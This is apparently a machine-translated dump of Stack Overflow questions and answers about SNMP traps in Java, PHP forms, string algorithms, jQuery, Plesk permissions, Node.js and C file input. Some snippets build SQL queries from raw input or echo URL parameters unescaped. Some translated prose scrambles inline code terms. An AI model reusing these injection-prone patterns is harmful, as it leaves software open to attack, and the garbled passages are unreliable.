我正在使用adventnet SNMPAPI 开发一个UDP 监听程序。现在我需要将监听数据保存到数据库中。当我这样做时，我得到了错误。任何人都可以帮助这个plzz...

这是我的代码。

```
import com.adventnet.snmp.beans.*; 
import com.adventnet.snmp.snmp2.*; 
import com.adventnet.snmp.snmp2.usm.*; 
import java.io.*; 
import java.net.*; 
import java.sql.*; 
import java.util.regex.*; 

public class trapreceiver { 

private static int MIBS = 0; 
private static int COMMUNITY = 1; 
private static int PORT = 2; 

private static int USER_NAME = 3; 
private static int ENGID = 4; 
private static int AUTH_PROTOCOL = 5; 
private static int AUTH_PASSWORD = 6; 
private static int PRIV_PASSWORD = 7; 
private static int DEBUG = 8; 
private static int CONTEXT_NAME = 9; 
private static int CONTEXT_ID = 10; 
private static int PRIV_PROTOCOL = 11; 
private static String Data; 
public static void main(String args[]) { 

// Take care of getting options 

String usage = "trapreceiver [-m MIB_files] [-c community] [-p port] [-u user] [-e engineID(1234.../0x1234...)] [-a authProtocol(MD5/SHA)] [-w auth_password] [-s priv_password] [-d] [-n contextName] [-i contextId] [ -pp priv_protocol(DES/AES-128/AES-192/AES-256/3DES) ]"; 
String options[] = { "-m" , "-c", "-p", "-u", "-e", "-a", "-w", "-s", "-d", "-n", "-i", "-pp" }; 
String values[] = { null, null, null, null, null, null, null, null, "None", null, null, null}; 
String DataReceived = null; 
String userName = null; 
int authProtocol = USMUserEntry.NO_AUTH; 
String authPassword = new String (""); 
String privPassword = new String (""); 
String engineID = null; 

int privProtocol = USMUserEntry.NO_PRIV; 
byte secLevel = 0; 

ParseOptions opt = new ParseOptions(args,options,values, usage); 
if (opt.remArgs.length!=0) opt.usage_error(); 

// instantiate a receiver object 
SnmpTrapReceiver receiver = new SnmpTrapReceiver(); 

//To load MIBs from compiled file 
receiver.getMibOperations().setLoadFromCompiledMibs(true); 

if (values[COMMUNITY] != null) receiver.setCommunity( values[COMMUNITY] ); 
try { // set trap port to listen on if specified - else port 162 

if (values[PORT] != null) { 
receiver.setPortWithExceptionMsg( Integer.parseInt(values[PORT]) ); 
} else { 
System.out.println("Trying to set port 162 as the receiver port..."); 
receiver.setPortWithExceptionMsg( 162 ); 
} 

if (values[USER_NAME] != null) { 
userName = values[USER_NAME]; 
receiver.setPrincipal(userName); 
} 

if (values[ENGID] != null) { 
engineID = values[ENGID]; 
if(engineID.startsWith("0x") || engineID.startsWith("0X")) 
engineID = new String(gethexValue(values[ENGID])); 
} 

if (values[AUTH_PROTOCOL] != null) { 
if(engineID == null)    { 
System.out.println("EngineID is missing"); 
opt.usage_error(); 
} 
if ( values[AUTH_PROTOCOL].equals("SHA")) 
authProtocol = USMUserEntry.SHA_AUTH; 
else if ( values[AUTH_PROTOCOL].equals("MD5")) 
authProtocol = USMUserEntry.MD5_AUTH; 
else 
authProtocol = USMUserEntry.NO_AUTH; 
receiver.setAuthProtocol(authProtocol); 
receiver.setTrapAuthEnable(true); 
secLevel |= 0x01; 
} 

if (values[AUTH_PASSWORD] != null) { 
if(engineID == null)    { 
System.out.println("EngineID is missing"); 
opt.usage_error(); 
} 
if (secLevel == 0x01) { 
authPassword = values[AUTH_PASSWORD]; 
receiver.setAuthPassword(authPassword); 
} 
else 
opt.usage_error(); 
} 

if(values[PRIV_PASSWORD] != null) { 
if(engineID == null)    { 
System.out.println("EngineID is missing"); 
opt.usage_error(); 
} 
if (secLevel == 0x01) 
{ 
privPassword = values[PRIV_PASSWORD]; 
if(values[PRIV_PROTOCOL] != null) 
{ 
if(values[PRIV_PROTOCOL].equals("AES-128")) 
{ 
privProtocol = USMUserEntry.CFB_AES_128; 
} 
else if(values[PRIV_PROTOCOL].equals("AES-192")) 
{ 
privProtocol = USMUserEntry.CFB_AES_192; 
} 
else if(values[PRIV_PROTOCOL].equals("AES-256")) 
{ 
privProtocol = USMUserEntry.CFB_AES_256; 
} 
else if(values[PRIV_PROTOCOL].equals("3DES")) 
{ 
privProtocol = USMUserEntry.CBC_3DES; 
} 
else if(values[PRIV_PROTOCOL].equals("DES")) 
{ 
privProtocol = USMUserEntry.CBC_DES; 
} 
else 
{ 
System.out.println(" Invalid PrivProtocol "+values[PRIV_PROTOCOL]); 
opt.usage_error(); 
} 
} 

receiver.setPrivPassword(privPassword); 
receiver.setPrivProtocol(privProtocol); 

if(values[CONTEXT_NAME]!= null) 
receiver.setContextName(values[CONTEXT_NAME]); 
if(values[CONTEXT_ID]!= null) 
receiver.setContextID((values[CONTEXT_ID]).getBytes()); 

secLevel |= 0x02; 
} 
else 
opt.usage_error(); 
} 

} catch (NumberFormatException ex) { 
System.err.println("Invalid Integer Arg"); 
} catch (SnmpException se) { 
System.err.println(se); 
System.exit(1); 
} 

if(values[DEBUG].equals("Set")) 
receiver.setDebug(true); 

if(userName != null) 
receiver.createUserEntry(engineID.getBytes(),secLevel); 

if (values[MIBS] != null) try { // load MIB files 
System.err.println("Loading MIBs: "+values[MIBS]); 
receiver.loadMibs(values[MIBS]); 
System.err.println("Done."); 
} catch (Exception ex) { 
System.err.println("Error loading MIBs: "+ex); 
} 

// we need to instantiate a trap listener to listen for trap events 
TrapListener listener = new TrapListener() { 

// This method is called when trap is received by SnmpTrapReceiver 
public void receivedTrap(TrapEvent trap) { 
System.out.println("Got a trap from: "+trap.getRemoteHost()); 
// print PDU details 
String DataReceived = ((SnmpTrapReceiver)trap.getSource()).getMibOperations().toString(trap.getTrapPDU()); 
System.out.println(((SnmpTrapReceiver)trap.getSource()) 
.getMibOperations().toString(trap.getTrapPDU()) ); 
System.out.println("DataReceived :::: " + DataReceived); 
Pattern p = Pattern.compile("\\STRING.*?)\\."); 
Matcher m = p.matcher(DataReceived); 
m.find(); 
Data = m.group(1); 
System.out.println(Data); 

/*Connection con = null; 
String url = "jdbc:mysql://localhost:3306/"; 
String db = "snmp"; 
String driver = "com.mysql.jdbc.Driver"; 
Class.forName(driver); 
con = DriverManager.getConnection(url + db,"root","root"); 
Statement st = con.createStatement(); 
String sql = "INSERT INTO DataReceived(data) " + 
"VALUES ('"+m.group(1)+"')"; 
try 
{ 
int val = st.executeUpdate(sql); 
System.out.println("1 row affected"); 
catch (SQLException s) 
{ 
System.out.println("SQL statement is not executed!"); 
} 
}*/ 
if( trap.getTrapPDU().getCommand() == SnmpAPI.TRP_REQ_MSG) 
{ 
com.adventnet.snmp.mibs.MibTrap trapDefn = // get trap defn 
trap.getTrapDefinition(); 

if (trapDefn != null) // print name and description 
System.out.println("Trap Name: "+trapDefn.getName()+ 
"\nDescr: "+trapDefn.getDescription()); 
} 
else if( trap.getTrapPDU().getCommand() == SnmpAPI.TRP2_REQ_MSG) 
{ 

com.adventnet.snmp.mibs.MibNode notification = trap.getNotificationDefinition(); 
if(notification != null) 
System.out.println("Notification Name: "+notification.getLabel()+ 
"\nObjects: "+ notification.getObjects()+ 
"\nStatus: "+ notification.getStatus()+ 
"\nDescr: "+notification.getDescription()+ 
"\nParent: "+ notification.getParent()); 

} 
} 
/* 
Connection con = null; 
String url = "jdbc:mysql://localhost:3306/"; 
String db = "snmp"; 
String driver = "com.mysql.jdbc.Driver"; 

Class.forName(driver); 
con = DriverManager.getConnection(url + db,"root","root"); 
Statement st = con.createStatement(); 
String sql = "INSERT INTO DataReceived(data) " + 
"VALUES ('"+Data+"')"; 

int val = st.executeUpdate(sql); 
//System.out.println("1 row affected");*/ 
}; 

receiver.addTrapListener(listener); 

System.out.println("Trap Receiver started at port "+receiver.getPort()); 
} 

private static byte[] gethexValue(String value) 
{ 
byte temp; 
byte[] Key=new byte[value.length()/2 - 1]; 
String ss,str; 

ss = value.substring(2); 
for(int i = 0; i < ss.length(); i+=2) 
{ 
str = ss.substring(i,i+2); 
temp = (byte)Integer.parseInt(str,16); 
Key[i/2] = temp; 
} 
return Key; 
} 

} 
```

感谢Adv..

问候， Himachandra C.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-30T01:14:03.590

从例外：

> 线程“Thread-1”java.lang.IllegalStateException 中的异常：在 snmpv3trapd.callback(snmpv3trapd.java:305)
> 的 java.util.regex.Matcher.group(Matcher.java:468)中找不到匹配项

和代码：

```
String DataReceived = ...
...
Pattern p = Pattern.compile("\\STRING.*?)\\.");
Matcher m = p.matcher(DataReceived); 
m.find(); 
Data = m.group(1); 
```

异常被抛出`m.group(1)`。**该错误`No match found at java.util.regex.Matcher.group(...)`只是说明接收到的字符串（变量`DataReceived`）在任何地方都不匹配正则表达式。**

现在我相信您的代码还有其他内容。看一下`"\\STRING.*?)\\."` 字符串，它是以下正则表达式：

```
\STRING.*?)\. 
```

由于发生不匹配的关闭，这应该会给出错误`)`。现在，即使您更正了这一点，这个正则表达式也可能与您的内容不匹配。

第一个 char`\S`不匹配 letter `S`，而是字符类的否定版本`\s`（匹配空格）。这样，以`xTRING`or `#TRING`（等等）开头的字符串将匹配您的正则表达式。

### 把它们加起来：

我相信您想在序列之后`STRING`和 char 之前匹配字符串`.`。为此，请使用正则表达式：

```
STRING(.*?)\. 
```

因此模式为：

```
Pattern p = Pattern.compile("STRING(.*?)\\."); 
```

现在`m.group(1);`将在有比赛时工作。

如果您想在没有匹配项时避免异常，应检查`m.find()`结果：

```
Pattern p = Pattern.compile("STRING(.*?)\\.");
Matcher m = p.matcher(DataReceived); 
Data = null;
if (m.find()) {
    Data = m.group(1);
} 
```

[**注意：**如果可以，请停止以大写开头的变量名称。这不是 Java 约定。]

# php - 将 PHP 变量消息回显到 php 表单

> ID：15738285
> 
> 赞同：1
> 
> 时间：2013-04-01T05:47:52.433
> 
> 标签：php, forms, validation, echo

我在 new.php 中有一个基本的帖子表单，我想知道如何在其上回显（或显示）来自 new1.php 的 php 脚本变量消息。

新的.php：

```
 <body>
<div id="contact_form">
  <form name="contact" method="post" action="new1.php" id="contact">
    <fieldset>
      <label for="firstName" id="firstName_label">First Name*:</label>
      <input type="text" name="firstName" id="firstName" size="36" value="" class="text-input" />
      <label class="error" for="firstName" id="firstName_error">This field is required.</label>
      <br />
            <label for="lastName" id="lastName_label">Last Name:</label>
      <input type="text" name="lastName" id="lastName" size="36" value="" class="text-input" />
      <label class="error" for="lastName" id="lastName_error">This field is required.</label>
      <br />
      <label for="email" id="email_label">Email*:</label>
      <input type="text" name="email" id="email" size="36" value="" class="text-input" />
      <label class="error" for="email" id="email_error">This field is required.</label>
      <label class="error" for="email" id="email_error2">This is not a valid email address.</label>
      <br />
      <label for="postcode" id="postcode_label">Postcode:</label>
      <input type="text" name="postcode" id="postcode" size="12" value="" class="text-input" />
      <label class="error" for="postcode" id="postcode_error">This field is required.</label>

        <br />
      <input type="submit" name="submit" id="submit_btn" value="Send" />
    </fieldset>
  </form>
</div>
</body> 
```

new1.php - 返回 $msg_to_user 中的消息。如您所见，我在此页面上回显它们，但是如何将它们回显到表单所在的 new.php 中？

```
<?php
// set variables to null
$firstName   = "";
$lastName    = "";
$email       = "";
$postcode    = "";
$msg_to_user = "";

include_once "connect_to_mysql.php";

// set variables from form
// be sure to filter this data to deter SQL injection, filter before querying database
$firstName = $_POST['firstName'];
$lastName  = $_POST['lastName'];
$email     = $_POST['email'];
$postcode  = $_POST['postcode'];

$sql     = mysql_query("SELECT * FROM newsletter WHERE email='$email'");
$numRows = mysql_num_rows($sql);

// first name is mandatory
if (!$firstName) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">Please enter your name.</font></h4>';

    // email is mandatory
} else if (!$email) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">Please type an email address ' . $firstName . '.</font></h4>';

    // check email is valid
} else if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">' . $email . ' is not a valid email address.               </font></h4>';

    // check postcode is a number
} else if (!is_numeric($postcode)) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">Postcode must be a numeric value.</font></h4>';

    // check postcode is greater than 4 chars
} else if (strlen ($postcode) < 4) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">Postcode must be at least 4 characters.</font></h4>';

    // check postcode is less than 12 chars
} else if (strlen ($postcode) > 12) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">Postcode must be less than 12 characters.</font></h4>';

    // check email doesn't exist    
} else if ($numRows > 0) {
    $msg_to_user = '<br /><br /><h4><font color="FF0000">' . $email . ' is already in the system.</font></h4>';

    // if all test passed, insert details into database
} else {
    $sql_insert = mysql_query("INSERT INTO newsletter (firstName, lastName, email, postcode, dateTime) 
                                                    VALUES('$firstName','$lastName','$email','$postcode',now() )") or die(mysql_error());

    $msg_to_user = '<br /><br /><h4><font color="0066FF">Thanks ' . $firstName . $lastName . ' , you have been added successfully.</font></h4>';

    $firstName = "";
    $lastName  = "";
    $email     = "";
    $postcode  = "";
}
?>

<html>
<body>

<p>First Name: <?php
echo $firstName;
?></p>
<p>Last Name: <?php
echo $lastName;
?></p>
<p>Email: <?php
echo $email;
?></p>
<p>Postcode: <?php
echo $postcode;
?></p>
<p>Message: <?php
echo $msg_to_user;
?></p>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:04:03.727

最简单的方法是使用 header 函数从 new1.php 重定向到 new.php。重定向时，通过 url 传递 $msg_to_user。

为此，在为 $msg_to_user 分配适当的值后，立即在 new1.php 中添加以下代码

```
header("location: new.php?msg_to_user=".$msg_to_user);
exit; 
```

并在 new.php 中添加以下代码：

```
echo $_GET['msg_to_user']; //this will display the message 
```

另一种方法是使用 session 跨页面访问值。

在 new1.php 中插入以下代码以在会话变量中设置消息：

```
session_start();
$_SESSION['msg_to_user'] = $msg_to_user;
header("location: new.php);
exit; 
```

在 new.php 中添加以下代码以检索在 new1.php 中设置的消息：

```
session_start();
if (isset($_SESSION['msg_to_user'])) {
    echo $_SESSION['msg_to_user'];
    unset($_SESSION['msg_to_user']);//After displaying the message unset it, to make sure that the message is displayed only once.
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T05:55:02.643

使用`ajax`或`php sessions`来执行此操作。

这是如何使用`php sessions`.

**在 new1.php**

```
session_start();
$_SESSION['name']=$variable; 
```

**在新的.php**

```
session_start();
echo $_SESSION['name']; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T05:58:17.017

通过会话传递验证消息。而不是删除会话值，`$_SESSION['name']='';` 因此消息只显示一次。

# string - 将字符串 a 转换为字符串 b

> ID：15738289
> 
> 赞同：1
> 
> 时间：2013-04-01T05:48:06.983
> 
> 标签：string, algorithm, optimization, data-structures

给定 2 个字符串`A`和，您必须在两个操作`B`中转换`A`为：`B`

*   `delete(i, len)``i`: 删除从from开始的 len 个字符`A`（你可以不删除任何字符）
*   `insert(i, str)``A`:在-th 索引处插入一个字符串 str `i`（你可以插入一个空字符串）

您必须尽量减少删除操作删除的字符数。

约束：

*   插入只能在删除后应用
*   删除和插入只能应用一次

示例 1：

```
A = aabcdef  
B = aaefg 
```

答案：`delete(2, 3)`; `insert(4, "g")`. 总而言之，删除了 3 个字符，这是我们能做的最好的。

示例 2：

```
A = aaaaa  
B = a 
```

我们只需要删除 4 个字符

我想到了`O(n^3)`解决`O(n^2)`方案，但有人告诉我有比这更好的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T07:40:26.080

我想我有一个`O(n)`解决方案。它分几个步骤完成。

首先，让我们重新表述问题。我们必须从中删除一个子字符串`A`和一个子字符串，`B`以便剩下的内容相等。我们想从`A`as possbile 中删除 as short substring。请注意，您的插入操作实际上等同于对`B`.

**引理。**如果从`A`and中去掉相等的前缀或后缀`B`，则不会影响最佳解决方案。把证据留给读者:)

现在，提取 and 的最大公共后缀和前缀`A`，`B`so `A=XA*Y`, `B=XB*Y`, where `X`and `Y`are substrings。如果`A*`or`B*`为空，我们得到一个简单的退化案例。如果不是，让我们做一个新的符号`A<-A*`，`B<-B*`。

此时`first(A) != first(B)`和`last(A) != last(B)`。否则，我们应该在上一步中包含一个通用符号作为前缀或后缀：

```
A = a1 A' a2
B = b1 B' b2 
```

其中`a1 = first(A)`, `a2 = last(A)`, `b1 = first(B)`, `b2 = last(B)`and是`A'`and的子`B'`串。在这里，。`A``B``a1 != b1``a2 != b2`

为了使相等`A`，`B`我们必须从一个字符串中删除第一个符号并从另一个字符串中删除最后一个符号。你这里有两个案例。让我们只考虑一个，您从 中删除第一个符号和从 中删除`A`最后一个符号`B`。

您现在要做的就是从开头删除尽可能少的符号`A`，以便留下的后缀等于某个前缀 of `B`。为此，您应该构建一个字符串的[后缀树](http://en.wikipedia.org/wiki/Suffix_tree)`A`并遍历所有前缀`B`以检查它们是否出现在后缀树中。然后选择最大的。完成后，您将拥有最大的字符串`C`，即 的后缀`A`和前缀`B`：

```
A = PC
B = CS 
```

`P`从`A`和`S`从删除`B`，你就完成了。

对于原始`A`和`B`（未删除公共部分），我们有：

```
A = XPCY
B = XCSY 
```

在问题的原始表述中，`P`被删除并被`S`插入。

后缀树可以在`O(n)`. 在第一步中剥离最常见的后缀和前缀需要`O(n)`. 后缀树遍历在`O(n)`.

# eclipse - Ajax 侦听器仅在

> ID：15738292
> 
> 赞同：1
> 
> 时间：2013-04-01T05:48:36.633
> 
> 标签：eclipse, jsf-2, primefaces, glassfish

我正在通过读取数据库然后选择值进行进一步处理来构建一个下拉列表。问题出现在处理部分。

下拉列表的 ajax 侦听器仅在*备用*选择时触发，而不是在*每个*选择时触发。如果我第一次选择一个值，监听器不会触发。如果我第二次选择它会再次触发。第三次，它再次没有触发，依此类推。

```
<p:selectOneMenu id="selectedBPZero" value="#{selectCriteriaBean.selectedBPZero}" >
    <f:selectItem itemValue="0" itemLabel="Select Option" />
    <f:selectItem itemValue="1" itemLabel="Add New BP" />
    <f:selectItems value="#{selectCriteriaBean.bpZeroList}"/>
    <p:ajax listener="#{selectCriteriaBean.bpZeroListSelectActionByAjaxCall}" event="change" update="selectedBPOne,selectedBPOneTextInfo" process="@this"/>
</p:selectOneMenu> 
```

侦听器方法如下

```
public void bpZeroListSelectActionByAjaxCall() {
    setParentBusinessProcessId(0);
    setSelectedBPOne(0);
    setSelectedBPTwo(0);

    setBPOneListRendered(false);
    setBPTwoListRendered(false);

    setModifyButtonBPZeroRendered(false);       
    setModifyButtonBPOneRendered(false);
    setModifyButtonBPTwoRendered(false);
    if (getSelectedBPZero() == 0) {
        RedirectScreen.redirectToPage("/ALM/home.faces");
    } else {
        if (getSelectedBPZero() == 1) {
            setAddBPLevelNumber(0);
            addBP();                            
        } else {
            setBPOneListRendered(true);
            setModifyButtonBPZeroRendered(true);
            // Get BP List
            bpLevelOneList = bpList(1,getSelectedBusinessProcessLevelZero());
            RedirectScreen.redirectToPage("/ALM/home.faces");       
        }
    }
} 
```

我尝试将事件更改为`valueChange`and `click`，但它不起作用。我正在使用 GlassFish 设置 Eclipse。

我在 Rational Application Developer (RAD) 中测试的相同代码，它在那里工作。

TIA

# jquery - jQuery 解析 JSON 对象和数组

> ID：15738296
> 
> 赞同：3
> 
> 时间：2013-04-01T05:48:53.323
> 
> 标签：jquery, json, each, arrays

在以下代码中：

```
$.getJSON('<?php echo $this->Html->url(array('controller'=>'accounts', 'action'=>'get_customers_order_mcs')); ?>/'+customer_order_id,
                function(data){
                    var json_mc = data.MasterCarton.mc;
                    alert(json_mc);
                    $.each(json_mc,function(){
                         console.log(this);
                   });
             }); 
```

作为响应发送的数据如下 -

```
{
     "MasterCarton":{
                         "id":"40",
                         "mc":"[
                                    "1":{\"mc_number\":\"Warehouse1\\\/2013-2014\\\/CO\\\/ABC Corp\\\/239\\\/101-Red-1\",\"config\":{\"S2\":10,\"S1\":10},\"delivered\":0},            "2":{\"mc_number\":\"Warehouse1\\\/2013-2014\\\/CO\\\/ABC Corp\\\/239\\\/101-Red-2\",\"config\":{\"S2\":10,\"S1\":10},\"delivered\":0},                  "3":{\"mc_number\":\"Warehouse1\\\/2013-2014\\\/CO\\\/ABC Corp\\\/239\\\/104-Black-3\",\"config\":{\"S1\":7,\"S2\":7,\"S5\":6},\"delivered\":0},               "4":{\"mc_number\":\"Warehouse1\\\/2013-2014\\\/CO\\\/ABC Corp\\\/239\\\/104-Black-4\",\"config\":{\"S1\":7,\"S2\":7,\"S5\":6},\"delivered\":0},              "5":{\"mc_number\":\"Warehouse1\\\/2013-2014\\\/CO\\\/ABC Corp\\\/239\\\/104-Black-5\",\"config\":{\"S1\":6,\"S2\":6,\"S5\":7},\"delivered\":0}
                               ]",
                         "delivery_note_id":"0",
                         "customer_order_id":"314"
                 }
} 
```

mc里面的json数组如下图——

```
[
   "1":{
      "mc_number":"Warehouse1\/2013-2014\/CO\/ABC Corp\/239\/101-Red-1",
      "config":{
         "S2":10,
         "S1":10
      },
      "delivered":0
   },
   "2":{
      "mc_number":"Warehouse1\/2013-2014\/CO\/ABC Corp\/239\/101-Red-2",
      "config":{
         "S2":10,
         "S1":10
      },
      "delivered":0
   },
   "3":{
      "mc_number":"Warehouse1\/2013-2014\/CO\/ABC Corp\/239\/104-Black-5",
      "config":{
         "S1":6,
         "S2":6,
         "S5":7
      },
      "delivered":0
   }
] 
```

我正在尝试使用 jquery 解析其中的每个对象，每个对象如下 -

```
 {
   "mc_number":"Warehouse1\/2013-2014\/CO\/ABC Corp\/239\/101-Red-1",
   "config":{
      "S2":10,
      "S1":10
   },
   "delivered":0
} 
```

要获得上述对象，我使用以下 jquery 代码-

```
$.each(json_mc,function(){
       // What should the code be so as to get each individual objects.         
}); 
```

那是.each的每一次都应该让我-

```
 {
      "mc_number":"Warehouse1\/2013-2014\/CO\/ABC Corp\/239\/101-Red-1",
      "config":{
         "S2":10,
         "S1":10
      },
      "delivered":0
   } 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T05:51:57.240

您所追求的只是`this`在每次迭代时设置的：

```
$.each(json_mc,function(){
    console.log(this);
}); 
```

**更新**

鉴于您显示的原始响应，您可能需要再解码一次：

```
$.each($.parseJSON(json_mc), function() {
    console.log(this);
}); 
```

# php - 在 Linux 服务器上使用 plesk 的 PHP 会话错误

> ID：15738299
> 
> 赞同：0
> 
> 时间：2013-04-01T05:49:08.547
> 
> 标签：php, html, sql, wordpress, stream

我的朋友在`linux server`使用`plesk`.

他`404 error`几乎在每一页上，他得到的错误代码粘贴在下面：（我不能发布两个以上的链接，所以`yaoihavenreborn.com`你会看到`***`

```
[Sun Mar 31 19:17:52 2013] [error] [client 69.158.139.233] PHP Warning: is_readable():
 open_basedir restriction in effect. File(/var/www/vhosts/***/httpdocs/wp-
content/plugins/content-progress/content-progress.php/content-progress-en_US.mo) is not 
within the allowed path(s): (/var/www/vhosts/***/httpdocs:.:/php:/tmp) in 
/var/www/vhosts/***/httpdocs/wp-includes/l10n.php on line 339, referer: http://***/whats-
new/ 
```

我们查看了提到纠正`open_basedir`错误的类似帖子，但创建一个`vhost`并没有解决问题，我们根本不知道该怎么办。

`error log`这是使用以下说明添加后的副本`vhost`：`http://www.bigsoft.co.uk/blog/index.php/2007/12/30/fixing-php-s-require-open_basedir-restri`

```
[Mon Apr 01 00:53:47 2013] [error] [client 99.112.124.229] PHP Warning:  fopen(/var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/css/mce_modify.css): failed to open stream: Permission denied in /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/options_functions.php on line 1209, referer: http://***/forums/forum/yaoi-haven-reborn/
[Mon Apr 01 00:53:47 2013] [error] [client 99.112.124.229] PHP Warning:  fwrite() expects parameter 1 to be resource, boolean given in /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/options_functions.php on line 1210, referer: http://***/forums/forum/yaoi-haven-reborn/
[Mon Apr 01 00:53:47 2013] [error] [client 99.112.124.229] PHP Warning:  fclose() expects parameter 1 to be resource, boolean given in /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/options_functions.php on line 1211, referer: http://***/forums/forum/yaoi-haven-reborn/
[Mon Apr 01 00:53:47 2013] [error] [client 99.112.124.229] PHP Warning:  chmod(): Operation not permitted in /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/options_functions.php on line 1212, referer: http://***/forums/forum/yaoi-haven-reborn/
[Mon Apr 01 00:53:49 2013] [error] [client 67.1.158.170] PHP Warning:  fopen(/var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/css/mce_modify.css): failed to open stream: Permission denied in /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/options_functions.php on line 1209, referer: http://***/forums/topic/blah-blah-favorite-gamesmusic-and-making-friends3/
[Mon Apr 01 00:53:50 2013] [error] [client 108.29.88.87] PHP Warning:  chmod(): Operation not permitted in /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/options_functions.php on line 1212, referer: http://***/forums/topic/blah-blah-favorite-gamesmusic-and-making-friends3/ 
```

感谢您的任何帮助:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:42:05.880

您的文件夹中的文件权限设置不正确`www`：您应该为您的`www-data`用户（组）设置项目中的文件和文件夹可读。

```
sudo chgrp -R www-data /var/www/ #set the usergroup for all files, directories in www folder
sudo chmod -R g+r /var/www # make all file/dir readeable by group
find /var/www/ -type d | xargs sudo chmod g+xs //make all dir executeable (and set the group rights inherited by newly created files, dirs in the future, so you dont need to repeat the permission settings when you will create new files. 
```

在下面的命令中，将 /var/www 更改为您的项目根目录，如果服务器中有多个项目，并且您只有当前项目有问题。

并且你应该设置可写，哪些文件需要被php写入：

```
sudo chmod g+w /var/www/vhosts/***/httpdocs/wp-content/plugins/ultimate-tinymce/css/mce_modify.css
//repeat this on all file need to be written by your webapp 
```

# android - 通过 GetLocality 获取城市名称

> ID：15738300
> 
> 赞同：1
> 
> 时间：2013-04-01T05:49:20.567
> 
> 标签：android

我正在开发一个 android 应用程序，我必须在其中从服务器获取当前城市名称。我在下面的代码中实现了这一点。问题是当我尝试获取当前城市名称并且当时互联网连接速度很慢时，应用程序被强制关闭。任何人都可以帮助我如何防止我的应用程序被强制关闭。我只想举杯简单的消息，比如“互联网连接慢”。帮我拿到它。

```
public String getCity() {
    String city = "";
     try
        {
         Geocoder geo=new Geocoder(mContext, Locale.getDefault());
         Log.i("TAG","latitude"+ latitude+"\n logitude"+longitude);
            List<Address> addresses=geo.getFromLocation(latitude, longitude, maxResults);
               if (addresses.size() > 0) 
               {
                   Log.i("TAG",""+addresses.size()+"-"+addresses.get(0).getLocality());
                   city=addresses.get(0).getLocality();
               }

        }// end of try
        catch(IOException e)
        {
            city="error";
        }
    return city;
} 
```

# node.js - 在 node.js 中如何在处理 uncaughtException 中的一些异常时重新启动服务器

> ID：15738302
> 
> 赞同：1
> 
> 时间：2013-04-01T05:49:38.167
> 
> 标签：node.js, uncaught-exception

在我的应用程序中，我使用 uncaughtException 来处理应用程序错误。在此我如何重新启动服务器。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T05:55:42.653

使用[永远模块](https://npmjs.org/package/forever)。

```
npm install forever 
```

`forever`无论出于何种原因，它都会在您退出时重新启动您的服务器。

这意味着您可以`process.exit();`在您希望服务器重新启动的任何时候在您的代码中执行。

您需要一个启动和停止脚本才能永远参与。

典型的启动脚本如下所示。

```
#!/bin/sh
./node_modules/forever/bin/forever \
 start \
 -al log.forever \
 -ao log.traffic \
 -ae log.errors \
app.js 
```

典型的停止脚本如下所示：

```
#!/bin/sh
./node_modules/forever/bin/forever stop app.js 
```

在您的异常处理代码中看起来像这样：

```
process.on('uncaughtException', function (err) {
    console.log(err.stack);
    process.exit();
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T05:59:38.987

您可以使用内置的[nodejs 集群](http://nodejs.org/api/cluster.html)功能。使用此模块，您可以设置一个 master 和一些 worker，当一个 worker 死亡时，您可以生成一个新的。我最近的一个项目的一个例子：

```
var cluster = require('cluster'),
numCpus = require('os').cpus().length;

if (cluster.isMaster) {

    for (var i = 0; i < numCpus; i++) {
        console.log("Spawning worker...");
        cluster.fork();
    }

    cluster.on('exit', function (worker) {
        console.log("Worker " + worker.pid + " died");
        var newWorker = cluster.fork();
        console.log("Spawning new worker " + newWorker.pid);
    });

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T13:09:52.403

Forever 运行良好且设置简单

您也可以按子堆栈尝试[舰队](https://github.com/substack/fleet)。Fleet 使将代码部署到一台或多台服务器变得非常容易。然后您可以使用生成您的服务器进程，`fleet spawn -- node ...`并且舰队将自动重新启动任何崩溃的进程

# java - 根据我在JAVA中explorer.exe的状态运行批处理文件

> ID：15738310
> 
> 赞同：0
> 
> 时间：2013-04-01T05:50:24.060
> 
> 标签：java

我想根据 explorer.exe 状态运行一些批处理文件。也就是说，我想在桌面处于活动状态时运行一个批处理文件，如果我的电脑中的驱动器打开并且另一个不同的批处理文件，我想运行另一个批处理文件如果打开该驱动器内的文件夹，则文件。我想知道是否有任何必要的信息来完成这项工作？..

提前谢谢..

# c - 将 .txt 文件读入二维数组

> ID：15738311
> 
> 赞同：0
> 
> 时间：2013-04-01T05:50:27.407
> 
> 标签：c, file-io

我有一个文本文件如下：

```
1 2 3 4 5
6 7 8 9 10
11 12 13 14 15
16 17 18 19 20 
```

我想读入一个二维整数数组。问题是该文件没有提供有关二维数据维度的信息。我试着这样做：

```
FILE *input_file = fopen(argv[1], "r");
while (! feof(input_file)) {
    read = fscanf(input_file, "%d%c", &x, &del);
    if (read != 2) {
        i--;
        break;
    }
    in_data[i][j] = x;
    if ( del == '\n') {
        i++;
        j =0;
        continue;
    }
    j++;
} 
```

